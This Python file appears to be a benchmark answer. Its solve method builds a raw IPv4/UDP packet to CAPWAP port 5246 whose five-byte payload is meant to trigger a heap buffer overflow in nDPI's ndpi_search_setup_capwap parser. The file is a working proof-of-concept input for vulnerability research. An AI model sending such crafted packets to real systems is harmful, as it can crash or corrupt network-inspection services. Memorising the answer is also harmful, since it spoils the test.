import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in ndpi_search_setup_capwap.
        The PoC is a raw IPv4 UDP packet destined for the CAPWAP control port (5246).
        """
        # --- IP Header Construction (20 bytes) ---
        # Version 4, IHL 5
        ver_ihl = 0x45
        tos = 0
        # Total Length: 20 (IP) + 8 (UDP) + 5 (Payload) = 33 bytes
        total_len = 33
        ip_id = 1
        flags_frag = 0
        ttl = 64
        proto = 17  # UDP
        checksum = 0
        src_ip = 0x7F000001  # 127.0.0.1
        dst_ip = 0x7F000001  # 127.0.0.1
        
        # Pack header with 0 checksum
        ip_header_temp = struct.pack('!BBHHHBBHII', 
                                     ver_ihl, tos, total_len, ip_id, flags_frag, 
                                     ttl, proto, checksum, src_ip, dst_ip)
        
        # Calculate IP Checksum
        s = 0
        for i in range(0, len(ip_header_temp), 2):
            w = (ip_header_temp[i] << 8) + ip_header_temp[i+1]
            s += w
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        checksum = ~s & 0xFFFF
        
        # Final IP Header
        ip_header = struct.pack('!BBHHHBBHII', 
                                ver_ihl, tos, total_len, ip_id, flags_frag, 
                                ttl, proto, checksum, src_ip, dst_ip)
        
        # --- UDP Header Construction (8 bytes) ---
        src_port = 12345
        dst_port = 5246  # CAPWAP Control Port
        udp_len = 13     # 8 header + 5 payload
        udp_checksum = 0
        
        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_checksum)
        
        # --- Payload Construction (5 bytes) ---
        # \x00\x00\x00\x01: Satisfies the CAPWAP preamble check in nDPI
        # \xFF: Triggers the buffer overread/overflow in the parsing logic
        payload = b'\x00\x00\x00\x01\xff'
        
        return ip_header + udp_header + payload
